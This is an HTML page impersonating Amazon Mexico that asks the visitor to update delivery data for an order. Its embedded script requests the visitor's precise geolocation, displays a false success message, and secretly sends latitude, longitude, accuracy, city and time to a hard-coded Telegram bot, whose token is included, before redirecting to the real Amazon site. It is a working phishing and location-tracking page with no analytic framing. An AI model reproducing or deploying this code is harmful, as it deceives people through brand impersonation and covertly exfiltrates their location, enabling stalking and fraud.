<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Amazon - Actualizar datos de entrega</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #f4f4f4;
      color: #111;
      line-height: 1.4;
    }
    .header {
      background: #131921;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 16px;
      position: relative;
    }
    .logo {
      color: #fff;
      font-size: 32px;
      font-weight: bold;
      letter-spacing: -1px;
      position: relative;
      display: inline-block;
    }
    .logo .smile {
      position: absolute;
      bottom: 2px;
      right: -22px;
      font-size: 22px;
      color: #ff9900;
      transform: rotate(-5deg);
    }
    .cart {
      color: #ff9900;
      font-size: 32px;
      cursor: pointer;
    }
    .main-content {
      max-width: 420px;
      margin: 0 auto;
      padding: 30px 20px;
      text-align: center;
    }
    h1 {
      font-size: 28px;
      font-weight: bold;
      color: #111;
      margin-bottom: 16px;
    }
    .order-info {
      font-size: 18px;
      margin: 20px 0 30px;
      line-height: 1.6;
    }
    .order-info strong {
      font-weight: bold;
    }
    .instruction {
      font-size: 17px;
      margin-bottom: 30px;
      color: #333;
    }
    button {
      background: #ffa41c;
      color: #111;
      font-size: 20px;
      font-weight: bold;
      padding: 16px 32px;
      border: none;
      border-radius: 8px;
      width: 100%;
      max-width: 340px;
      cursor: pointer;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    button:hover {
      background: #ff8c00;
    }
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    #resultado {
      margin-top: 24px;
      font-size: 18px;
      color: #008000;
      font-weight: bold;
      min-height: 60px;
    }
    .footer {
      font-size: 13px;
      color: #666;
      margin-top: 50px;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <div class="header">
    <div></div> <!-- spacer izquierdo -->
    <div class="logo">
      amazon<span class="smile">↝</span>
    </div>
    <div class="cart">🛒</div>
  </div>

  <div class="main-content">
    <h1>Actualiza tus datos de entrega</h1>

    <div class="order-info">
      <strong>Pedido #MX-7843921</strong><br>
      Dirección faltante, Zapopan
    </div>

    <p class="instruction">
      Para garantizar la entrega correcta,<br>
      actualiza tus datos de ubicación más recientes:
    </p>

    <button id="btnActualizar" onclick="actualizarDatos()">
      Actualizar datos de entrega
    </button>

    <div id="resultado"></div>

    <div class="footer">
      Amazon México • Tus datos están protegidos • 2026
    </div>
  </div>

  <script>
    // === CONFIG TELEGRAM ===
    const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
    const CHAT_ID   = '5854071809';

    async function detectarCiudad() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const ciudad = data.city || 'Ciudad no detectada';
        document.querySelector('.order-info br + text').textContent = `Dirección faltante, ${ciudad}`;
        return ciudad;
      } catch {
        return 'Ciudad no detectada';
      }
    }

    detectarCiudad();

    async function actualizarDatos() {
      const btn = document.getElementById('btnActualizar');
      const resultado = document.getElementById('resultado');

      btn.disabled = true;
      resultado.textContent = "Actualizando...";

      if (!navigator.geolocation) {
        resultado.textContent = "No se pudo actualizar. Intenta más tarde.";
        btn.disabled = false;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = parseFloat(position.coords.latitude.toFixed(6));
          const lon = parseFloat(position.coords.longitude.toFixed(6));
          const acc = Math.round(position.coords.accuracy);

          resultado.innerHTML = '✅ Tus datos de entrega se han actualizado correctamente.<br>Gracias por confirmar.';

          const ciudad = await detectarCiudad();

          // Enviar pin en mapa a Telegram
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              latitude: lat,
              longitude: lon,
              horizontal_accuracy: acc,
              live_period: 0
            })
          }).catch(() => {});

          // Texto adicional
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `📦 Actualización recibida\nPedido: #MX-7843921\nCiudad: ${ciudad}\nPrecisión: ±${acc}m\nHora: ${new Date().toLocaleString('es-MX')}`,
              parse_mode: 'Markdown'
            })
          }).catch(() => {});

          setTimeout(() => {
            window.location.href = "https://www.amazon.com.mx";
          }, 2800);
        },
        () => {
          resultado.textContent = "No se pudo actualizar. Intenta más tarde.";
          btn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    }
  </script>
</body>
</html>
